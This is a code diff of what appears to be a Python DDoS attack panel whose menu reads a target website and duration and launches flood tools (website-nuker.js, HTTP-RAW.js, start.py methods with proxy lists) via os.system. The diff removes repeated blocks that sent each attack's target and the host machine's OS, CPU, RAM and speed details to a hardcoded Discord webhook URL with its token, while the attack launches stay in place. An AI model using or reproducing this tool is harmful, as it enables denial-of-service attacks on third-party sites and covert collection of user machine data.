-                    responsex = webhookx.execute()
                     load()
                     license()
                     menu()
@@ -1841,85 +722,9 @@ def menu():
                     timewebsitenuker1 = input("\033[31m\033[1m⮞ \033[0m\033[96mTime\033[31m:\033[36m\033[31m")
                     sendattackwebsitenuker1 = ("node website-nuker.js " + websitenukerwebsite1 + " " + timewebsitenuker1)
                     tip()
-                    webhook = DiscordWebhook(url='https://discord.com/api/webhooks/859843861575499877/ZQuAMpvIb7cri0lXM4oFJUr6ABVyspCBSFqPuctLk6hC_M4Lm6jr0Hk-lCkKlPVnIOaU')
-
-
-                    embed = DiscordEmbed(title='Panel Attack API', description='Notices every sended attack via the panel.', color='03b2f8')
-
-
-                    embed.set_author(name=f'Machine Name: {hostname}', icon_url='https://www.shareicon.net/data/512x512/2015/09/16/101867_archlinux_512x512.png')
-
-                    embed.set_image(url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')
-
-
-                    embed.set_thumbnail(url='https://www.logomoose.com/wp-content/uploads/2009/10/attack.jpg')
-
-
-                    embed.set_footer(text='Panel Attack API', icon_url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')
-
-
-                    embed.set_timestamp()
-
-
-                    embed.add_embed_field(name='Attack Send to:', value=f'{websitenukerwebsite1}')
                     
-                    embed.add_embed_field(name='Time:', value=f'{timewebsitenuker1}')
-                    embed.add_embed_field(name='Method:', value='nuker-proxied')
-                    embed.add_embed_field(name='Machine:', value=f'{machine}')
-                    embed.add_embed_field(name='System OS:', value=f'{systemos}')
-                    embed.add_embed_field(name='Physical Cores:', value=f'{pyshicalcores}')
-                    embed.add_embed_field(name='Logical Cores:', value=f'{logicalcores}')
-                    embed.add_embed_field(name='Total RAM:', value=f'{totalram}')
-                    embed.add_embed_field(name='Available RAM:', value=f'{avaliableram}')
-                    embed.add_embed_field(name='Used RAM:', value=f'{usedram}')
-                    embed.add_embed_field(name='RAM Usage in %:', value=f'{ramusagepercent}')
-                    embed.add_embed_field(name='VPS Speed:', value=f'{speedtestbaba}')
-                  
-
-
-
-                    webhook.add_embed(embed)
-                    response = webhook.execute()
                     os.system(sendattackwebsitenuker1)
-                    webhookx = DiscordWebhook(url='https://discord.com/api/webhooks/859843861575499877/ZQuAMpvIb7cri0lXM4oFJUr6ABVyspCBSFqPuctLk6hC_M4Lm6jr0Hk-lCkKlPVnIOaU')
-
-
-                    embedx = DiscordEmbed(title='Panel Attack API', description='Notices every STOPPED attack via the panel.', color='03b2f8')
-
-
-                    embedx.set_author(name=f'Machine Name: {hostname}', icon_url='https://www.shareicon.net/data/512x512/2015/09/16/101867_archlinux_512x512.png')
-
-                    embedx.set_image(url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')
-
-
-                    embedx.set_thumbnail(url='https://www.logomoose.com/wp-content/uploads/2009/10/attack.jpg')
-
-
-                    embedx.set_footer(text='Panel Attack API', icon_url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')
-
-
-                    embedx.set_timestamp()
-
-
-                    embedx.add_embed_field(name='Attack Stopped for:', value=f'{websitenukerwebsite1}')
                     
-                    embedx.add_embed_field(name='Time:', value=f'{timewebsitenuker1}')
-                    embedx.add_embed_field(name='Method:', value='nuker-proxyless')
-                    embedx.add_embed_field(name='Machine:', value=f'{machine}')
-                    embedx.add_embed_field(name='System OS:', value=f'{systemos}')
-                    embedx.add_embed_field(name='Physical Cores:', value=f'{pyshicalcores}')
-                    embedx.add_embed_field(name='Logical Cores:', value=f'{logicalcores}')
-                    embedx.add_embed_field(name='Total RAM:', value=f'{totalram}')
-                    embedx.add_embed_field(name='Available RAM:', value=f'{avaliableram}')
-                    embedx.add_embed_field(name='Used RAM:', value=f'{usedram}')
-                    embedx.add_embed_field(name='RAM Usage in %:', value=f'{ramusagepercent}')
-                    embedx.add_embed_field(name='VPS Speed:', value=f'{speedtestbaba}')
-                  
-
-
-
-                    webhookx.add_embed(embedx)
-                    responsex = webhookx.execute()
                     load()
                     license()
                     menu()
@@ -1937,85 +742,9 @@ def menu():
                     rawtime = input('\033[31m\033[1m⮞ \033[0m\033[96mTime\033[31m:\033[36m\033[31m')
                     sendrawhttp = ("node HTTP-RAW.js " + targetraw + " " + rawtime)
                     tip()
-                    webhook = DiscordWebhook(url='https://discord.com/api/webhooks/859843861575499877/ZQuAMpvIb7cri0lXM4oFJUr6ABVyspCBSFqPuctLk6hC_M4Lm6jr0Hk-lCkKlPVnIOaU')
-
-
-                    embed = DiscordEmbed(title='Panel Attack API', description='Notices every sended attack via the panel.', color='03b2f8')
-
-
-                    embed.set_author(name=f'Machine Name: {hostname}', icon_url='https://www.shareicon.net/data/512x512/2015/09/16/101867_archlinux_512x512.png')
-
-                    embed.set_image(url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')
-
-
-                    embed.set_thumbnail(url='https://www.logomoose.com/wp-content/uploads/2009/10/attack.jpg')
-
-
-                    embed.set_footer(text='Panel Attack API', icon_url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')
-
-
-                    embed.set_timestamp()
-
-
-                    embed.add_embed_field(name='Attack Send to:', value=f'{targetraw}')
                     
-                    embed.add_embed_field(name='Time:', value=f'{rawtime}')
-                    embed.add_embed_field(name='Method:', value='http-raw')
-                    embed.add_embed_field(name='Machine:', value=f'{machine}')
-                    embed.add_embed_field(name='System OS:', value=f'{systemos}')
-                    embed.add_embed_field(name='Physical Cores:', value=f'{pyshicalcores}')
-                    embed.add_embed_field(name='Logical Cores:', value=f'{logicalcores}')
-                    embed.add_embed_field(name='Total RAM:', value=f'{totalram}')
-                    embed.add_embed_field(name='Available RAM:', value=f'{avaliableram}')
-                    embed.add_embed_field(name='Used RAM:', value=f'{usedram}')
-                    embed.add_embed_field(name='RAM Usage in %:', value=f'{ramusagepercent}')
-                    embed.add_embed_field(name='VPS Speed:', value=f'{speedtestbaba}')
-                  
-
-
-
-                    webhook.add_embed(embed)
-                    response = webhook.execute()
                     os.system(sendrawhttp)
-                    webhookx = DiscordWebhook(url='https://discord.com/api/webhooks/859843861575499877/ZQuAMpvIb7cri0lXM4oFJUr6ABVyspCBSFqPuctLk6hC_M4Lm6jr0Hk-lCkKlPVnIOaU')
-
-
-                    embedx = DiscordEmbed(title='Panel Attack API', description='Notices every STOPPED attack via the panel.', color='03b2f8')
-
-
-                    embedx.set_author(name=f'Machine Name: {hostname}', icon_url='https://www.shareicon.net/data/512x512/2015/09/16/101867_archlinux_512x512.png')
-
-                    embedx.set_image(url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')
-
-
-                    embedx.set_thumbnail(url='https://www.logomoose.com/wp-content/uploads/2009/10/attack.jpg')
-
-
-                    embedx.set_footer(text='Panel Attack API', icon_url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')
-
-
-                    embedx.set_timestamp()
-
-
-                    embed.add_embed_field(name='Attack Stopped for:', value=f'{targetraw}')
-                    
-                    embed.add_embed_field(name='Time:', value=f'{rawtime}')
-                    embedx.add_embed_field(name='Method:', value='http-raw')
-                    embedx.add_embed_field(name='Machine:', value=f'{machine}')
-                    embedx.add_embed_field(name='System OS:', value=f'{systemos}')
-                    embedx.add_embed_field(name='Physical Cores:', value=f'{pyshicalcores}')
-                    embedx.add_embed_field(name='Logical Cores:', value=f'{logicalcores}')
-                    embedx.add_embed_field(name='Total RAM:', value=f'{totalram}')
-                    embedx.add_embed_field(name='Available RAM:', value=f'{avaliableram}')
-                    embedx.add_embed_field(name='Used RAM:', value=f'{usedram}')
-                    embedx.add_embed_field(name='RAM Usage in %:', value=f'{ramusagepercent}')
-                    embedx.add_embed_field(name='VPS Speed:', value=f'{speedtestbaba}')
-                  
-
-
-
-                    webhookx.add_embed(embedx)
-                    responsex = webhookx.execute()
+                   
                     
                     load()
                     license()
@@ -2038,89 +767,9 @@ def menu():
                 mhgetTIME = input("\033[31m\033[1m⮞ \033[0m\033[96mTime:\033[31m:\033[36m\033[31m")
                 mhgetsend = ('python3 start.py gsb ' + mhgetWEB + ' 1' + f' {mhogetTHREADS} proxies.txt {mhgetmultiip} {mhgetTIME}')
                 tip()
-                webhook = DiscordWebhook(url='https://discord.com/api/webhooks/859843861575499877/ZQuAMpvIb7cri0lXM4oFJUr6ABVyspCBSFqPuctLk6hC_M4Lm6jr0Hk-lCkKlPVnIOaU')
-
-
-                embed = DiscordEmbed(title='Panel Attack API', description='Notices every sended attack via the panel.', color='03b2f8')
-
-
-                embed.set_author(name=f'Machine Name: {hostname}', icon_url='https://www.shareicon.net/data/512x512/2015/09/16/101867_archlinux_512x512.png')
-
-                embed.set_image(url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')
-
-
-                embed.set_thumbnail(url='https://www.logomoose.com/wp-content/uploads/2009/10/attack.jpg')
-
-
-                embed.set_footer(text='Panel Attack API', icon_url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')
-
-
-                embed.set_timestamp()
-
-
-                embed.add_embed_field(name='Attack Send to:', value=f'{mhgetWEB}')
-                embed.add_embed_field(name='Threads:', value=f'{mhogetTHREADS}')
-                embed.add_embed_field(name='Multi IP:', value=f'{mhgetmultiip}')
-                embed.add_embed_field(name='Time:', value=f'{mhgetTIME}')
-                    
-                embed.add_embed_field(name='Method:', value='mh-projectshield')
-                embed.add_embed_field(name='Machine:', value=f'{machine}')
-                embed.add_embed_field(name='System OS:', value=f'{systemos}')
-                embed.add_embed_field(name='Physical Cores:', value=f'{pyshicalcores}')
-                embed.add_embed_field(name='Logical Cores:', value=f'{logicalcores}')
-                embed.add_embed_field(name='Total RAM:', value=f'{totalram}')
-                embed.add_embed_field(name='Available RAM:', value=f'{avaliableram}')
-                embed.add_embed_field(name='Used RAM:', value=f'{usedram}')
-                embed.add_embed_field(name='RAM Usage in %:', value=f'{ramusagepercent}')
-                embed.add_embed_field(name='VPS Speed:', value=f'{speedtestbaba}')
-                  
-
-
-
-                webhook.add_embed(embed)
-                response = webhook.execute()
+                
                 os.system(mhgetsend)
-                webhookx = DiscordWebhook(url='https://discord.com/api/webhooks/859843861575499877/ZQuAMpvIb7cri0lXM4oFJUr6ABVyspCBSFqPuctLk6hC_M4Lm6jr0Hk-lCkKlPVnIOaU')
-
-
-                embedx = DiscordEmbed(title='Panel Attack API', description='Notices every STOPPED attack via the panel.', color='03b2f8')
-
-
-                embedx.set_author(name=f'Machine Name: {hostname}', icon_url='https://www.shareicon.net/data/512x512/2015/09/16/101867_archlinux_512x512.png')
-
-                embedx.set_image(url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')
-
-
-                embedx.set_thumbnail(url='https://www.logomoose.com/wp-content/uploads/2009/10/attack.jpg')
-
-
-                embedx.set_footer(text='Panel Attack API', icon_url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')
-
-
-                embedx.set_timestamp()
-
-
-                embedx.add_embed_field(name='Attack Stopped for:', value=f'{mhgetWEB}')
-                embedx.add_embed_field(name='Threads:', value=f'{mhogetTHREADS}')
-                embedx.add_embed_field(name='Multi IP:', value=f'{mhgetmultiip}')
-                embedx.add_embed_field(name='Time:', value=f'{mhgetTIME}')
-                    
-                embedx.add_embed_field(name='Method:', value='mh-projectshield')
-                embedx.add_embed_field(name='Machine:', value=f'{machine}')
-                embedx.add_embed_field(name='System OS:', value=f'{systemos}')
-                embedx.add_embed_field(name='Physical Cores:', value=f'{pyshicalcores}')
-                embedx.add_embed_field(name='Logical Cores:', value=f'{logicalcores}')
-                embedx.add_embed_field(name='Total RAM:', value=f'{totalram}')
-                embedx.add_embed_field(name='Available RAM:', value=f'{avaliableram}')
-                embedx.add_embed_field(name='Used RAM:', value=f'{usedram}')
-                embedx.add_embed_field(name='RAM Usage in %:', value=f'{ramusagepercent}')
-                embedx.add_embed_field(name='VPS Speed:', value=f'{speedtestbaba}')
-                  
-
-
-
-                webhookx.add_embed(embedx)
-                responsex = webhookx.execute()
+                
                 load()
                 license()
                 menu()
@@ -2138,89 +787,9 @@ def menu():
                 mhgetTIME = input("\033[31m\033[1m⮞ \033[0m\033[96mTime:\033[31m:\033[36m\033[31m")
                 mhgetsend = ('python3 start.py avb ' + mhgetWEB + ' 1' + f' {mhogetTHREADS} proxies.txt {mhgetmultiip} {mhgetTIME}')
                 tip()
-                webhook = DiscordWebhook(url='https://discord.com/api/webhooks/859843861575499877/ZQuAMpvIb7cri0lXM4oFJUr6ABVyspCBSFqPuctLk6hC_M4Lm6jr0Hk-lCkKlPVnIOaU')
-
-
-                embed = DiscordEmbed(title='Panel Attack API', description='Notices every sended attack via the panel.', color='03b2f8')
-
-
-                embed.set_author(name=f'Machine Name: {hostname}', icon_url='https://www.shareicon.net/data/512x512/2015/09/16/101867_archlinux_512x512.png')
-
-                embed.set_image(url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')
-
-
-                embed.set_thumbnail(url='https://www.logomoose.com/wp-content/uploads/2009/10/attack.jpg')
-
-
-                embed.set_footer(text='Panel Attack API', icon_url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')
-
-
-                embed.set_timestamp()
-
-
-                embed.add_embed_field(name='Attack Send to:', value=f'{mhgetWEB}')
-                embed.add_embed_field(name='Threads:', value=f'{mhogetTHREADS}')
-                embed.add_embed_field(name='Multi IP:', value=f'{mhgetmultiip}')
-                embed.add_embed_field(name='Time:', value=f'{mhgetTIME}')
-                    
-                embed.add_embed_field(name='Method:', value='mh-arvancloud')
-                embed.add_embed_field(name='Machine:', value=f'{machine}')
-                embed.add_embed_field(name='System OS:', value=f'{systemos}')
-                embed.add_embed_field(name='Physical Cores:', value=f'{pyshicalcores}')
-                embed.add_embed_field(name='Logical Cores:', value=f'{logicalcores}')
-                embed.add_embed_field(name='Total RAM:', value=f'{totalram}')
-                embed.add_embed_field(name='Available RAM:', value=f'{avaliableram}')
-                embed.add_embed_field(name='Used RAM:', value=f'{usedram}')
-                embed.add_embed_field(name='RAM Usage in %:', value=f'{ramusagepercent}')
-                embed.add_embed_field(name='VPS Speed:', value=f'{speedtestbaba}')
-                  
-
-
-
-                webhook.add_embed(embed)
-                response = webhook.execute()
+                
                 os.system(mhgetsend)
-                webhookx = DiscordWebhook(url='https://discord.com/api/webhooks/859843861575499877/ZQuAMpvIb7cri0lXM4oFJUr6ABVyspCBSFqPuctLk6hC_M4Lm6jr0Hk-lCkKlPVnIOaU')
-
-
-                embedx = DiscordEmbed(title='Panel Attack API', description='Notices every STOPPED attack via the panel.', color='03b2f8')
-
-
-                embedx.set_author(name=f'Machine Name: {hostname}', icon_url='https://www.shareicon.net/data/512x512/2015/09/16/101867_archlinux_512x512.png')
-
-                embedx.set_image(url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')
-
-
-                embedx.set_thumbnail(url='https://www.logomoose.com/wp-content/uploads/2009/10/attack.jpg')
-
-
-                embedx.set_footer(text='Panel Attack API', icon_url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')
-
-
-                embedx.set_timestamp()
-
-
-                embedx.add_embed_field(name='Attack Stopped for:', value=f'{mhgetWEB}')
-                embedx.add_embed_field(name='Threads:', value=f'{mhogetTHREADS}')
-                embedx.add_embed_field(name='Multi IP:', value=f'{mhgetmultiip}')
-                embedx.add_embed_field(name='Time:', value=f'{mhgetTIME}')
-                    
-                embedx.add_embed_field(name='Method:', value='mh-arvancloud')
-                embedx.add_embed_field(name='Machine:', value=f'{machine}')
-                embedx.add_embed_field(name='System OS:', value=f'{systemos}')
-                embedx.add_embed_field(name='Physical Cores:', value=f'{pyshicalcores}')
-                embedx.add_embed_field(name='Logical Cores:', value=f'{logicalcores}')
-                embedx.add_embed_field(name='Total RAM:', value=f'{totalram}')
-                embedx.add_embed_field(name='Available RAM:', value=f'{avaliableram}')
-                embedx.add_embed_field(name='Used RAM:', value=f'{usedram}')
-                embedx.add_embed_field(name='RAM Usage in %:', value=f'{ramusagepercent}')
-                embedx.add_embed_field(name='VPS Speed:', value=f'{speedtestbaba}')
-                  
-
-
-
-                webhookx.add_embed(embedx)
-                responsex = webhookx.execute()
+                
                 load()
                 license()
                 menu()
@@ -2238,89 +807,8 @@ def menu():
                 mhgetTIME = input("\033[31m\033[1m⮞ \033[0m\033[96mTime:\033[31m:\033[36m\033[31m")
                 mhgetsend = ('python3 start.py even ' + mhgetWEB + ' 1' + f' {mhogetTHREADS} proxies.txt {mhgetmultiip} {mhgetTIME}')
                 tip()
-                webhook = DiscordWebhook(url='https://discord.com/api/webhooks/859843861575499877/ZQuAMpvIb7cri0lXM4oFJUr6ABVyspCBSFqPuctLk6hC_M4Lm6jr0Hk-lCkKlPVnIOaU')
-
-
-                embed = DiscordEmbed(title='Panel Attack API', description='Notices every sended attack via the panel.', color='03b2f8')
-
-
-                embed.set_author(name=f'Machine Name: {hostname}', icon_url='https://www.shareicon.net/data/512x512/2015/09/16/101867_archlinux_512x512.png')
-
-                embed.set_image(url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')
-
-
-                embed.set_thumbnail(url='https://www.logomoose.com/wp-content/uploads/2009/10/attack.jpg')
-
-
-                embed.set_footer(text='Panel Attack API', icon_url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')
-
-
-                embed.set_timestamp()
-
-
-                embed.add_embed_field(name='Attack Send to:', value=f'{mhgetWEB}')
-                embed.add_embed_field(name='Threads:', value=f'{mhogetTHREADS}')
-                embed.add_embed_field(name='Multi IP:', value=f'{mhgetmultiip}')
-                embed.add_embed_field(name='Time:', value=f'{mhgetTIME}')
-                    
-                embed.add_embed_field(name='Method:', value='mh-even')
-                embed.add_embed_field(name='Machine:', value=f'{machine}')
-                embed.add_embed_field(name='System OS:', value=f'{systemos}')
-                embed.add_embed_field(name='Physical Cores:', value=f'{pyshicalcores}')
-                embed.add_embed_field(name='Logical Cores:', value=f'{logicalcores}')
-                embed.add_embed_field(name='Total RAM:', value=f'{totalram}')
-                embed.add_embed_field(name='Available RAM:', value=f'{avaliableram}')
-                embed.add_embed_field(name='Used RAM:', value=f'{usedram}')
-                embed.add_embed_field(name='RAM Usage in %:', value=f'{ramusagepercent}')
-                embed.add_embed_field(name='VPS Speed:', value=f'{speedtestbaba}')
-                  
-
-
-
-                webhook.add_embed(embed)
-                response = webhook.execute()
+                
                 os.system(mhgetsend)
-                webhookx = DiscordWebhook(url='https://discord.com/api/webhooks/859843861575499877/ZQuAMpvIb7cri0lXM4oFJUr6ABVyspCBSFqPuctLk6hC_M4Lm6jr0Hk-lCkKlPVnIOaU')
-
-
-                embedx = DiscordEmbed(title='Panel Attack API', description='Notices every STOPPED attack via the panel.', color='03b2f8')
-
-
-                embedx.set_author(name=f'Machine Name: {hostname}', icon_url='https://www.shareicon.net/data/512x512/2015/09/16/101867_archlinux_512x512.png')
-
-                embedx.set_image(url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')
-
-
-                embedx.set_thumbnail(url='https://www.logomoose.com/wp-content/uploads/2009/10/attack.jpg')
-
-
-                embedx.set_footer(text='Panel Attack API', icon_url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')
-
-
-                embedx.set_timestamp()
-
-
-                embedx.add_embed_field(name='Attack Stopped for:', value=f'{mhgetWEB}')
-                embedx.add_embed_field(name='Threads:', value=f'{mhogetTHREADS}')
-                embedx.add_embed_field(name='Multi IP:', value=f'{mhgetmultiip}')
-                embedx.add_embed_field(name='Time:', value=f'{mhgetTIME}')
-                    
-                embedx.add_embed_field(name='Method:', value='mh-even')
-                embedx.add_embed_field(name='Machine:', value=f'{machine}')
-                embedx.add_embed_field(name='System OS:', value=f'{systemos}')
-                embedx.add_embed_field(name='Physical Cores:', value=f'{pyshicalcores}')
-                embedx.add_embed_field(name='Logical Cores:', value=f'{logicalcores}')
-                embedx.add_embed_field(name='Total RAM:', value=f'{totalram}')
-                embedx.add_embed_field(name='Available RAM:', value=f'{avaliableram}')
-                embedx.add_embed_field(name='Used RAM:', value=f'{usedram}')
-                embedx.add_embed_field(name='RAM Usage in %:', value=f'{ramusagepercent}')
-                embedx.add_embed_field(name='VPS Speed:', value=f'{speedtestbaba}')
-                  
-
-
-
-                webhookx.add_embed(embedx)
-                responsex = webhookx.execute()
                 load()
                 license()
                 menu()
@@ -2338,89 +826,9 @@ def menu():
                 mhgetTIME = input("\033[31m\033[1m⮞ \033[0m\033[96mTime:\033[31m:\033[36m\033[31m")
                 mhgetsend = ('python3 start.py dyn ' + mhgetWEB + ' 1' + f' {mhogetTHREADS} proxies.txt {mhgetmultiip} {mhgetTIME}')
                 tip()
-                webhook = DiscordWebhook(url='https://discord.com/api/webhooks/859843861575499877/ZQuAMpvIb7cri0lXM4oFJUr6ABVyspCBSFqPuctLk6hC_M4Lm6jr0Hk-lCkKlPVnIOaU')
-
-
-                embed = DiscordEmbed(title='Panel Attack API', description='Notices every sended attack via the panel.', color='03b2f8')
-
-
-                embed.set_author(name=f'Machine Name: {hostname}', icon_url='https://www.shareicon.net/data/512x512/2015/09/16/101867_archlinux_512x512.png')
-
-                embed.set_image(url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')
-
-
-                embed.set_thumbnail(url='https://www.logomoose.com/wp-content/uploads/2009/10/attack.jpg')
-
-
-                embed.set_footer(text='Panel Attack API', icon_url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')
-
-
-                embed.set_timestamp()
-
-
-                embed.add_embed_field(name='Attack Send to:', value=f'{mhgetWEB}')
-                embed.add_embed_field(name='Threads:', value=f'{mhogetTHREADS}')
-                embed.add_embed_field(name='Multi IP:', value=f'{mhgetmultiip}')
-                embed.add_embed_field(name='Time:', value=f'{mhgetTIME}')
-                    
-                embed.add_embed_field(name='Method:', value='mh-dyn')
-                embed.add_embed_field(name='Machine:', value=f'{machine}')
-                embed.add_embed_field(name='System OS:', value=f'{systemos}')
-                embed.add_embed_field(name='Physical Cores:', value=f'{pyshicalcores}')
-                embed.add_embed_field(name='Logical Cores:', value=f'{logicalcores}')
-                embed.add_embed_field(name='Total RAM:', value=f'{totalram}')
-                embed.add_embed_field(name='Available RAM:', value=f'{avaliableram}')
-                embed.add_embed_field(name='Used RAM:', value=f'{usedram}')
-                embed.add_embed_field(name='RAM Usage in %:', value=f'{ramusagepercent}')
-                embed.add_embed_field(name='VPS Speed:', value=f'{speedtestbaba}')
-                  
-
-
-
-                webhook.add_embed(embed)
-                response = webhook.execute()
+                
                 os.system(mhgetsend)
-                webhookx = DiscordWebhook(url='https://discord.com/api/webhooks/859843861575499877/ZQuAMpvIb7cri0lXM4oFJUr6ABVyspCBSFqPuctLk6hC_M4Lm6jr0Hk-lCkKlPVnIOaU')
-
-
-                embedx = DiscordEmbed(title='Panel Attack API', description='Notices every STOPPED attack via the panel.', color='03b2f8')
-
-
-                embedx.set_author(name=f'Machine Name: {hostname}', icon_url='https://www.shareicon.net/data/512x512/2015/09/16/101867_archlinux_512x512.png')
-
-                embedx.set_image(url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')
-
-
-                embedx.set_thumbnail(url='https://www.logomoose.com/wp-content/uploads/2009/10/attack.jpg')
-
-
-                embedx.set_footer(text='Panel Attack API', icon_url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')
-
-
-                embedx.set_timestamp()
-
-
-                embedx.add_embed_field(name='Attack Stopped for:', value=f'{mhgetWEB}')
-                embedx.add_embed_field(name='Threads:', value=f'{mhogetTHREADS}')
-                embedx.add_embed_field(name='Multi IP:', value=f'{mhgetmultiip}')
-                embedx.add_embed_field(name='Time:', value=f'{mhgetTIME}')
-                    
-                embedx.add_embed_field(name='Method:', value='mh-dyn')
-                embedx.add_embed_field(name='Machine:', value=f'{machine}')
-                embedx.add_embed_field(name='System OS:', value=f'{systemos}')
-                embedx.add_embed_field(name='Physical Cores:', value=f'{pyshicalcores}')
-                embedx.add_embed_field(name='Logical Cores:', value=f'{logicalcores}')
-                embedx.add_embed_field(name='Total RAM:', value=f'{totalram}')
-                embedx.add_embed_field(name='Available RAM:', value=f'{avaliableram}')
-                embedx.add_embed_field(name='Used RAM:', value=f'{usedram}')
-                embedx.add_embed_field(name='RAM Usage in %:', value=f'{ramusagepercent}')
-                embedx.add_embed_field(name='VPS Speed:', value=f'{speedtestbaba}')
-                  
-
-
-
-                webhookx.add_embed(embedx)
-                responsex = webhookx.execute()
+                
                 load()
                 license()
                 menu()
@@ -2438,89 +846,9 @@ def menu():
                 mhgetTIME = input("\033[31m\033[1m⮞ \033[0m\033[96mTime:\033[31m:\033[36m\033[31m")
                 mhgetsend = ('python3 start.py get ' + mhgetWEB + ' 1' + f' {mhogetTHREADS} proxies.txt {mhgetmultiip} {mhgetTIME}')
                 tip()
-                webhook = DiscordWebhook(url='https://discord.com/api/webhooks/859843861575499877/ZQuAMpvIb7cri0lXM4oFJUr6ABVyspCBSFqPuctLk6hC_M4Lm6jr0Hk-lCkKlPVnIOaU')
-
-
-                embed = DiscordEmbed(title='Panel Attack API', description='Notices every sended attack via the panel.', color='03b2f8')
-
-
-                embed.set_author(name=f'Machine Name: {hostname}', icon_url='https://www.shareicon.net/data/512x512/2015/09/16/101867_archlinux_512x512.png')
-
-                embed.set_image(url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')
-
-
-                embed.set_thumbnail(url='https://www.logomoose.com/wp-content/uploads/2009/10/attack.jpg')
-
-
-                embed.set_footer(text='Panel Attack API', icon_url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')
-
-
-                embed.set_timestamp()
-
-
-                embed.add_embed_field(name='Attack Send to:', value=f'{mhgetWEB}')
-                embed.add_embed_field(name='Threads:', value=f'{mhogetTHREADS}')
-                embed.add_embed_field(name='Multi IP:', value=f'{mhgetmultiip}')
-                embed.add_embed_field(name='Time:', value=f'{mhgetTIME}')
-                    
-                embed.add_embed_field(name='Method:', value='mh-get')
-                embed.add_embed_field(name='Machine:', value=f'{machine}')
-                embed.add_embed_field(name='System OS:', value=f'{systemos}')
-                embed.add_embed_field(name='Physical Cores:', value=f'{pyshicalcores}')
-                embed.add_embed_field(name='Logical Cores:', value=f'{logicalcores}')
-                embed.add_embed_field(name='Total RAM:', value=f'{totalram}')
-                embed.add_embed_field(name='Available RAM:', value=f'{avaliableram}')
-                embed.add_embed_field(name='Used RAM:', value=f'{usedram}')
-                embed.add_embed_field(name='RAM Usage in %:', value=f'{ramusagepercent}')
-                embed.add_embed_field(name='VPS Speed:', value=f'{speedtestbaba}')
-                  
-
-
-
-                webhook.add_embed(embed)
-                response = webhook.execute()
+                
                 os.system(mhgetsend)
-                webhookx = DiscordWebhook(url='https://discord.com/api/webhooks/859843861575499877/ZQuAMpvIb7cri0lXM4oFJUr6ABVyspCBSFqPuctLk6hC_M4Lm6jr0Hk-lCkKlPVnIOaU')
-
-
-                embedx = DiscordEmbed(title='Panel Attack API', description='Notices every STOPPED attack via the panel.', color='03b2f8')
-
-
-                embedx.set_author(name=f'Machine Name: {hostname}', icon_url='https://www.shareicon.net/data/512x512/2015/09/16/101867_archlinux_512x512.png')
-
-                embedx.set_image(url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')
-
-
-                embedx.set_thumbnail(url='https://www.logomoose.com/wp-content/uploads/2009/10/attack.jpg')
-
-
-                embedx.set_footer(text='Panel Attack API', icon_url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')
-
-
-                embedx.set_timestamp()
-
-
-                embedx.add_embed_field(name='Attack Stopped for:', value=f'{mhgetWEB}')
-                embedx.add_embed_field(name='Threads:', value=f'{mhogetTHREADS}')
-                embedx.add_embed_field(name='Multi IP:', value=f'{mhgetmultiip}')
-                embedx.add_embed_field(name='Time:', value=f'{mhgetTIME}')
-                    
-                embedx.add_embed_field(name='Method:', value='mh-get')
-                embedx.add_embed_field(name='Machine:', value=f'{machine}')
-                embedx.add_embed_field(name='System OS:', value=f'{systemos}')
-                embedx.add_embed_field(name='Physical Cores:', value=f'{pyshicalcores}')
-                embedx.add_embed_field(name='Logical Cores:', value=f'{logicalcores}')
-                embedx.add_embed_field(name='Total RAM:', value=f'{totalram}')
-                embedx.add_embed_field(name='Available RAM:', value=f'{avaliableram}')
-                embedx.add_embed_field(name='Used RAM:', value=f'{usedram}')
-                embedx.add_embed_field(name='RAM Usage in %:', value=f'{ramusagepercent}')
-                embedx.add_embed_field(name='VPS Speed:', value=f'{speedtestbaba}')
-                  
-
-
-
-                webhookx.add_embed(embedx)
-                responsex = webhookx.execute()
+                
                 load()
                 license()
                 menu()
@@ -2538,89 +866,9 @@ def menu():
                 mhgetTIME = input("\033[31m\033[1m⮞ \033[0m\033[96mTime:\033[31m:\033[36m\033[31m")
